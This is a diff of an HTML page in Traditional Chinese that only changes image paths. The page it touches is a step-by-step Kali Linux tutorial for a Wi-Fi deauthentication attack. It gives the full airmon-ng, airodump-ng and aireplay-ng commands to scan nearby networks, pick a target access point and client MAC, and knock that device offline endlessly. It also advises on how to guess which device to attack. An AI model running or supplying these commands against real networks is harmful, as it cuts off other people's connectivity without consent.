@@ -77,14 +77,14 @@
 	<p class="code" style="text-indent: 3em">(編碼) wpa_supplicant</p>
 	<p class="code" style="color:#B80000">15┌──(root㉿kali)-[/home/kali] </p>
 	<p class="code">16 # airmon-ng start wlan0</p>
-	<img class="style_Pic" src="2-4.png" width="500" >
+	<img class="style_Pic" src="Pic/2-4.png" width="500" >
 	<p style="text-indent: 4em">成功更變無線網卡為wlan0mon</p>
 	<hr/>
 	<p class="code" style="color:#B80000">17┌──(root㉿kali)-[/home/kali] </p>
 	<p class="code">18 # ifconfig wlan0mon up</p>
 	<p class="code" style="color:#B80000">19┌──(root㉿kali)-[/home/kali] </p>
 	<p class="code">20 # airodump-ng wlan0mon</p>
-	<img class="style_Pic" src="2-5.png" width="500" >
+	<img class="style_Pic" src="Pic/2-5.png" width="500" >
 	<ul><li style="list-style:circle" >會看到類似上圖的輸出，顯示你附近的所有Wi-Fi</li></ul>
 	<p style="text-indent: 4em">覺得搜索差不多了，就按ctrl+c結束搜索(會看到"Quitting..."系統字符) </p>
 	<hr/>
@@ -96,8 +96,8 @@
 	<p class="code">22 └─# airodump-ng -c 6 -w No_Wi-Fi_KuKu_O --bssid AA:65:2B:1F:3E:43 wlan0mon</p>
 	<p style="text-indent: 4em">插曲:這邊我的BSSID與上一個圖不同(沒有截到後面這一個BSSID的畫面) </p>
 	<p style="text-indent: 4em">此網路的連線狀況(有幾個裝置連線)</p>
-	<img class="style_Pic" src="2-6.png" width="600" >
-	<img class="style_Pic" src="2-8.png" width="600" >
+	<img class="style_Pic" src="Pic/2-6.png" width="600" >
+	<img class="style_Pic" src="Pic/2-8.png" width="600" >
 	<p>等個3分鐘蒐集好所有連線/想攻擊的裝置後按ctrl+c(會看到"Quitting..."系統字符)</p>
 	<p style="text-indent: 4em">這邊稍稍麻煩的是，如果連線的裝置很多，你要通靈你想攻擊的裝置(但可以藉著Rate 、Lost判斷裝置的遠近或是上網情況去判斷是不是你想攻擊的裝置)</p>
 	<hr/>
@@ -105,7 +105,7 @@
 	<p class="code" style="color:#B80000">23┌──(root㉿kali)-[/home/kali] </p>
 	<p style="text-indent: 4em">下面語法:aireplay-ng -0 (攻擊次數，0代表無限次) -a (BSSID網路位置碼) -c   (STATION裝置位置碼) (網卡名稱)</p>
 	<p class="code">24 └─# aireplay-ng -0 0 -a AA:65:2B:1F:3E:43 -c 7A:F1:10:02:7E:CF wlan0mon</p>
-	<img class="style_Pic" src="3-1.png" width="600" >
+	<img class="style_Pic" src="Pic/3-1.png" width="600" >
 	<ul><li style="list-style:circle" >看到上述畫面即成功讓對方斷線連不上網路</li></ul>
 	<p>無限攻擊這個裝置直到你按ctrl+c為止</p>
 	<hr/>
